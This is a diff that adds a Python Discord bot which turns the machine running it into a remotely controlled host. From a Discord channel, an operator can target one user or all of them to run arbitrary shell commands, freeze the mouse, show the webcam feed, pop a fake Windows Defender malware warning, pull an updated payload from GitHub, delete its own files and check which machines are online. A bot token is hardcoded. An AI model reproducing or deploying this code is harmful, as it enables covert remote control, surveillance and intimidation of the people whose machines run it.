@@ -1,1 +1,251 @@
-testing testing 123
+import discord
+import pyautogui
+import os
+from tkinter import *
+import tkinter.messagebox
+import ctypes # An included library with Python install.
+import cv2
+import random
+import sys
+import time
+
+import pygame
+import sys
+import subprocess
+import shutil
+import requests
+
+
+sys.path.append(os.path.join(os.path.dirname(__file__),'../../'))
+
+version = "0.0.01111"
+
+client = discord.Client(intents=discord.Intents.default())
+
+@client.event
+
+async def on_ready():
+    print('Logged in')
+    print("Username: ",end='')
+    print(client.user.name)
+    print("Userid: ",end='')
+    print(client.user.id)
+
+    
+def Mbox(title, text, style):
+  return ctypes.windll.user32.MessageBoxW(0, text, title, style)
+
+@client.event
+async def on_message(ctx):
+    global version
+    #if ctx.channelID == ("1009859513660211324"):
+    print(ctx.content)
+
+    if ctx.author == client.user:
+            return
+        
+    if str(os.getlogin()) in ctx.content:
+        print("workedddddd")
+    
+    
+        
+
+        if "hello" in ctx.content:
+            await ctx.channel.send("worked")
+
+        if "shutoff" in ctx.content:
+            sys.exit()
+
+        if str(ctx.content) == "lock":
+            x, y = pyautogui.position()
+            for i in range(50):
+                
+                pyautogui.moveTo(x, y)
+
+        
+        if "system(" in ctx.content:
+            msg = str(ctx.content)
+            msg = msg.replace("system(", "")
+            msg = msg.replace(")", "")
+            msg = msg.replace(os.getlogin(), "")
+            print(msg)
+            #os.system(msg)
+            subprocess.Popen(msg.split(),shell=True).communicate()
+
+
+
+        if "scare" in ctx.content:
+            print("siiii")
+
+            Mbox('Windows Defender', 'Your system has been detected containing malware. Action must be taken immediately.', 1)
+            print("good")
+        if "lock" in ctx.content:
+            x, y = pyautogui.position()
+            for i in range(50):
+                
+                pyautogui.moveTo(x, y)
+
+        if "camera" in ctx.content:
+            #cv2.namedWindow("I am alwayse watching(press esc to close)")
+            vc = cv2.VideoCapture(0)
+
+            if vc.isOpened(): # try to get the first frame
+                rval, frame = vc.read()
+            else:
+                rval = False
+
+            while rval:
+                cv2.imshow("I am alwayse watching(press esc to close)", frame)
+                rval, frame = vc.read()
+                key = cv2.waitKey(20)
+                if key == 27: # exit on ESC
+                    break
+
+            vc.release()
+            cv2.destroyWindow("I am alwayse watching(press esc to close)")
+
+        if "tp" in ctx.content:
+            x1, y1 = pyautogui.size()
+            for i in range(50):
+                x = random.randint(1, x1)
+                y = random.randint(1, y1)
+                pyautogui.moveTo(x, y)
+
+
+        if "update" in ctx.content:
+            import requests
+
+            url = 'https://github.com/gitslaya/UpdatingScript/blob/main/folder.zip'
+            #url = "https://www.mediafire.com/file/o87ueugu0rwpzxz/main.exe/file"
+
+
+            
+            file_destination = str(os.getcwd()) + "\\main.pyw"
+            print(file_destination)
+            res = requests.get(url)
+            print("updating")
+            if res.status_code == 200:  # http 200 means success
+                
+                with open(file_destination, 'wb') as file_handle:  # wb means Write Binary
+                    file_handle.write(res.content)
+            #mfd.Download(url, file_destination, quiet=True)
+
+                    print("done")
+
+        if "version" in ctx.content:
+            
+            time.sleep(.01)
+            await ctx.channel.send(version)
+
+
+        if "destroy" in ctx.content:
+            os.remove(os.getcwd() + "\main.pyw")
+            os.remove(__file__)
+
+        if "msg(" in ctx.content:
+            msg = str(ctx.content)
+            msg = msg.replace("msg(", "")
+            msg = msg.replace(")", "")
+            msg = msg.replace(str(os.getlogin()), "")
+            
+            Mbox('Attention!', msg, 1)
+
+
+
+    if "all" in ctx.content:
+            
+        if ctx.author == client.user:
+            return
+
+        if str(ctx.content) == "hello":
+            await ctx.channel.send("worked")
+
+        if str(ctx.content) == "lock":
+            x, y = pyautogui.position()
+            for i in range(50):
+                
+                pyautogui.moveTo(x, y)
+
+        
+        if "system(" in ctx.content:
+            msg = str(ctx.content)
+            msg = msg.replace("system(", "")
+            msg = msg.replace(")", "")
+            msg = msg.replace("all", "")
+            print(msg)
+            #os.system(msg)
+            subprocess.Popen(msg.split(),shell=True).communicate()
+
+        if "lock" in ctx.content:
+            x, y = pyautogui.position()
+            for i in range(50):
+                
+                pyautogui.moveTo(x, y)
+
+        if "scare" in ctx.content:
+            
+
+            Mbox('Windows Defender', 'Your system has been detected containing malware. Action must be taken immediately.', 1)
+
+        if "camera" in ctx.content:
+            #cv2.namedWindow("I am alwayse watching(press esc to close)")
+            vc = cv2.VideoCapture(0)
+
+            if vc.isOpened(): # try to get the first frame
+                rval, frame = vc.read()
+            else:
+                rval = False
+
+            while rval:
+                cv2.imshow("I am alwayse watching(press esc to close)", frame)
+                rval, frame = vc.read()
+                key = cv2.waitKey(20)
+                if key == 27: # exit on ESC
+                    break
+
+            vc.release()
+            cv2.destroyWindow("I am alwayse watching(press esc to close)")
+
+        if "tp" in ctx.content:
+            x1, y1 = pyautogui.size()
+            for i in range(50):
+                x = random.randint(1, x1)
+                y = random.randint(1, y1)
+                pyautogui.moveTo(x, y)
+
+        if "check" in ctx.content:
+            time.sleep(.01)
+            await ctx.channel.send(str(os.getlogin())+" is online!")
+
+        if "version" in ctx.content:
+            time.sleep(.01)
+            await ctx.channel.send(version)
+
+
+        if "destroy" in ctx.content:
+            os.remove(os.getcwd() + "\main.pyw")
+            os.remove(__file__)
+
+
+        if "shutoff" in ctx.content:
+            sys.exit()
+
+        if "msg(" in ctx.content:
+            msg = str(ctx.content)
+            msg = msg.replace("msg(", "")
+            msg = msg.replace(")", "")
+            msg = msg.replace("all", "")
+            
+            Mbox('Attention!', msg, 1)
+
+
+
+            
+
+
+
+        
+
+
+
+client.run('MTAwOTg4MjczMDQ2NjYzOTkxMg.G4vO2U.PWmPPIVWuQfueyoqlLsBBogHsSFtg7gdBuBtw8')
